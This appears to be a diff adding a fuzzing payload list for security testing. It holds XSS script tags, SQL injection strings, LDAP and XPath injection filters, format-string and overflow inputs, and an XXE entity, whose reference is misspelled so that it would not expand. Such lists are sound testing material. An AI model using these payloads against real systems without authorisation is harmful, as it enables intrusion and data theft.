@@ -1,0 +1,48 @@
+--INT--
+-1
+0
+--END INT--
+
+--BFO--
+A x 12288
+--END BFO--
+
+--FSE--
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+--END FSE--
+
+--XSS--
+>"><script>alert("XSS")</script>&
+"><STYLE>@import"javascript:alert('XSS')";</STYLE>
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+--END XSS--
+
+--SQI--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+--END SQI--
+
+--SQP--
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+--END SQP--
+
+--LDAP--
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+--END LDAP--
+
+--XPATH--
+'+or+'1'='1
+/
+//
+//*
+--END XPATH--
+
+--XML--
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+--END XML--
